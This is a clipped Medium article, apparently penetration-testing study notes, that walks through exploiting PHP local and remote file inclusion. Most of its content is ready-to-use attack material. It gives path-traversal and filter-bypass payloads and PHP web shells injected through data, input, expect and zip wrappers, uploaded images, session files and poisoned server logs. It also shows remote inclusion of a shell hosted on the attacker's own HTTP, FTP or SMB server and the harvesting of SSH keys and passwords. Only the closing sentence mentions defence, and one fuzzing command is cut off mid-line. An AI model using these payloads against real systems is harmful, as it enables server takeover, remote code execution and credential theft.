---
title: "File Inclusion Vulnerabilities: Comprehensive Guide"
source: "https://medium.com/@tareshsharma17/file-inclusion-vulnerabilities-comprehensive-guide-9883799e41ed"
author:
  - "[[Tareshsharma]]"
published: 2024-12-18
created: 2025-11-10
description: "File Inclusion Vulnerabilities: Comprehensive Guide File Inclusion vulnerabilities, such as Local File Inclusion (LFI) and Remote File Inclusion (RFI), are critical security flaws allowing attackers …"
tags:
  - "clippings"
---
[Sitemap](https://medium.com/sitemap/sitemap.xml)

Get unlimited access to the best of Medium for less than $1/week.[Become a member](https://medium.com/plans?source=upgrade_membership---post_top_nav_upsell-----------------------------------------)

[

Become a member

](https://medium.com/plans?source=upgrade_membership---post_top_nav_upsell-----------------------------------------)

File Inclusion vulnerabilities, such as Local File Inclusion (LFI) and Remote File Inclusion (RFI), are critical security flaws allowing attackers to access sensitive files or execute malicious code on a server. This guide explores these vulnerabilities' concepts, techniques, and exploitation methods.

### Local File Inclusion (LFI)

**Overview:** LFI vulnerabilities arise when user input is used to include local files on a server. By manipulating file paths, attackers can access sensitive files, such as `/etc/passwd` on Linux or `C:\Windows\boot.ini` on Windows.

1\. Basic LFI

Example:

```c
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```

Exploit: Change the `language` parameter to a sensitive file like `/etc/passwd`.

2\. Path Traversal

Developers may prepend directories (e.g., `./languages/`). To bypass this, use relative paths:

```c
../../../../etc/passwd
```

Minimize `../` usage for efficiency.

3\. Filename Prefix

Example: Here “lang\_ is appended with whatever the user data is”

```c
include("lang_" . $_GET['language']);
```

Bypass by using `/../../../etc/passwd`.

4\. Appended Extensions

If an extension is appended (e.g., `.php`):

```c
include($_GET['language'] . ".php");
```
- Use `%00` to terminate the string early (e.g., `/etc/passwd%00`).

5\. Second-Order Attacks

Occurs when user-controlled values (e.g., database entries) are indirectly included, such as poisoning a username value with `../../../etc/passwd`.

For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a `Second-Order` attack.

**Key Notes:**

- Use relative paths (`../`) to bypass directory restrictions.
- Be mindful of prefixes or appended extensions.
- Second-order attacks exploit indirect user-controlled input.

### LFI Protection Bypass Techniques

1\. Non-Recursive Path Traversal Filters

Filters that remove `../` once can be bypassed using payloads like:

```c
....// or ..././
```

2\. Encoding

URL encoding can bypass filters blocking characters like `.` or `/`:

```c
../ encoded as %2e%2e%2f
```

Double encoding may bypass stricter filters.

3\. Approved Paths

Regex filters may restrict inclusion to specific directories (e.g., `./languages/`). Bypass by starting the path with the approved directory and adding `../`:

```c
./languages/../../../../etc/passwd
```

4\. Appended Extensions

To bypass extensions like `.php`:

- **Path Truncation:** Create a string > 4096 characters to truncate the extension.
- **Null Bytes:** Use `%00` to terminate the string early (e.g., `/etc/passwd%00`).

### PHP Filters for LFI Exploitation (Reading source files )

**Overview:** PHP wrappers, such as `php://filter`, extend LFI attacks to read source code or execute commands.

fuzz the web app to find the pages available to get the source code.

```c
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.

Input Filters

Use `php://filter/read=convert.base64-encode/resource=<file>` to encode and retrieve PHP source code.

Example:

```c
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Decode using:

```c
echo '<BASE64_STRING>' | base64 -d
```

### Exploiting File Inclusion with PHP Wrappers (code execution)

We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function’s capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password. Or we can check the `.ssh` directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (`id_rsa`) and use it to SSH into the system.

We can also use various PHP wrappers to execute code —

**Data Wrapper**

Inject and execute PHP code as external data:

Will only work if allow\_url\_include is available.Check `allow_url_include` status using `php.ini`.

we can check this by following command:  
` curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value. If we see the option enabled, now we can use data wrapper.

Create a base64-encoded PHP web shell:

```c
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

Inject payload:

Here Encoded payload is 1st base64 encoded and then URL-encoded.

```c
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<ENCODED_PAYLOAD>&cmd=id
```

Alternatively we can use curl as well:  
`curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid`

**Input Wrapper**

Pass PHP code directly as POST data for execution.  
The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

we can check this by following command:  
` curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value. If we see the option enabled, now we can use Input wrapper.

```c
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

**Expect Wrapper  
**expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

we can check this by following command:  
` curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`

```c
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Execute commands directly through URL streams:

```c
http://<SERVER_IP>:<PORT>/index.php?language=expect://id
```

### Remote File Inclusion (RFI)

**Overview:** RFI vulnerabilities allow inclusion of remote files, leading to:

1. Enumeration: Identifying local-only ports and web applications.
2. Remote Code Execution (RCE): Executing malicious scripts hosted remotely.

**Key Vulnerable Functions:**

- `include()` and `file_get_contents()` in PHP.

Example:

```c
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

We can use different techniques to host our.PHP shell and execute it using the above example.

- **Host the Script**:
- **HTTP**: Start a Python HTTP server.
- `sudo python3 -m http.server <LISTENING_PORT>`
- Access the hosted shell via RFI:
```c
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
- **Alternative Protocols**:
- **FTP**:
- Start an FTP server:
- `sudo python -m pyftpdlib -p 21`
- Include via FTP:
- `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
- Provide credentials if required:
- `ftp://user:pass@localhost/shell.php`
- **SMB** (Windows):
- Use SMB when `allow_url_include` is disabled.
- Start an SMB server:
- `impacket-smbserver -smb2support share $(pwd)`
- Include script via UNC path:
- `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

### Combining File Uploads with LFI for RCE

1. Upload a file with embedded PHP code:
```c
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Include the uploaded file:

```c
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Using Wrappers for Malicious Files

- **Zip Wrapper:** Archive a PHP script into a `.zip`
```c
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
- and rename it to an allowed file type:
```c
zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

http://<SERVER\_IP>:<PORT>/index.php?language=zip://./profile\_images/shell.jpg%23shell.php&cmd=id

### Advanced LFI Techniques — Command Execution

**PHP Session Poisoning:**Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let’s first check if we have a `PHPSESSID` cookie set to our session.

Our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:, in this we can see if we have any value we as a user can controland check that.

Let’s try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:

```c
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let’s include the session file once again to look at the contents:

http://<SERVER\_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd

we can see the text #session\_poisoning, which means we can poison the session.

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:

```c
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:

http://<SERVER\_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

**Server Log Poisoning:** Server log poisoning involves injecting malicious code (e.g., a PHP web shell) into server logs by manipulating HTTP headers like `User-Agent`. By including the poisoned logs via an LFI vulnerability, attackers can execute commands on the server. This technique works on both Apache and Nginx logs if they are readable.

### Exploiting Server Log Poisoning

Verify Log Read Access via LFI

- Identify the server type (Apache or Nginx).
- Common log file locations:
- Apache: `/var/log/apache2/access.log` or `C:\xampp\apache\logs\access.log`
- Nginx: `/var/log/nginx/access.log` or `C:\nginx\log\access.log`
- Include the log file via the LFI vulnerability to check readability:
- `http://<SERVER_IP>:<PORT>/index.php?language=../../../../../var/log/apache2/access.log`

Poison the Log File

- Modify the `User-Agent` header to include malicious PHP code.
- Use **Burp Suite** or **cURL** to craft a request that injects the code:
- `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"`
- Any HTTP request can be logged, so it doesn’t have to involve the LFI endpoint.

Include the Poisoned Log File

- Use the LFI vulnerability to include the poisoned log file:
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`
- The server executes the PHP code (`system($_GET['cmd'])`) embedded in the log.

Test for Command Execution

- Verify by passing a command (e.g., `id`) using the `cmd` parameter:
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`

Tips for Optimization

- **Efficiency**: Logs can be large, so avoid excessive requests to prevent server crashes.
- **Alternate Targets**: If server logs are unreadable, try including:
- `/proc/self/environ`
- `/proc/self/fd/<N>` (replace `<N>` with a valid PID).

### Now Let's See How to Automate it….

The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

For example, we can fuzz the page for common `GET` parameters, as follows:

```c
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

Once we identify an exposed parameter that isn’t linked to any forms we tested, we can perform all of the LFI tests discussed.

Now we know that we have a parameter, we may want to run a quick test on that parameter to see if it is vulnerable to any LFI. There any many LFI wordlists we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once.

```c
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

The scan yielded a number of LFI payloads that can be used to exploit the vulnerability. Once we have the identified payloads, we should manually test them to verify that they work as expected and show the included file content.

Fuzzing Server Files:  
Different server files may be helpful in our LFI exploitation, so it would be helpful to know where such files exist.Such files include: Server webroot path, server config files and server logs.

1. Server webroot:  
	Server Webroot

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwords.

The following is an example of how we can do all of this with ffuf:

```c
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER
```

### Conclusion

File Inclusion vulnerabilities are powerful attack vectors with severe implications. Effective exploitation requires understanding server configurations, bypass techniques, and wrapper functionalities. By addressing these vulnerabilities through secure coding practices and robust filters, organizations can mitigate the risks and protect sensitive data

## More from Tareshsharma

## Recommended from Medium

[

See more recommendations

](https://medium.com/?source=post_page---read_next_recirc--9883799e41ed---------------------------------------)